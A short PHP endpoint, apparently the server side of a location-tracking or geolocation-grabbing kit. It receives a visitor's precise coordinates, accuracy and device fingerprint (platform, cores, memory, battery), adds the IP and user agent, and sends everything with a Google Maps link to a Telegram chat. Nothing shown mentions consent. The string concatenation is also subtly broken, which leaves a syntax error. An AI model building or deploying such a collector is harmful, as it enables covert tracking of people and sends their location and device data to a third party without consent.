<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

header('Content-Type: application/json');

$raw = file_get_contents('php://input');
$payload = json_decode($raw, true);

if (!is_array($payload)) {
    http_response_code(400);
    echo json_encode(['status'=>'bad_request']);
    exit;
}

$lat = $payload['latitude'] ?? null;
$lon = $payload['longitude'] ?? null;
$acc = $payload['accuracy'] ?? null;
$device = $payload['device'] ?? [];

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "📍 <b>Nueva ubicación</b>\n".
       "🌐 IP: $ip\n".
       "📌 Lat: $lat\n".
       "📌 Lon: $lon\n".
       "🎯 Precisión: {$acc}m\n".
       "🖥️ UA: $ua\n".
       "💻 Plataforma: {$device['platform']}\n".
       "🖥️ Arquitectura: {$device['architecture']}\n".
       "🧠 Núcleos: {$device['cores']}\n".
       "💾 Memoria: {$device['memory']} GB\n".
       "🔋 Batería: ".($device['batteryLevel'] ?? 'Desconocida')."\n".
       "⚡ Cargando: ".(($device['charging'] ?? false) ? 'Sí' : 'No')."\n".
       "⏰ Hora: $ts"
       "Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";

send_to_telegram($msg);

echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
?>
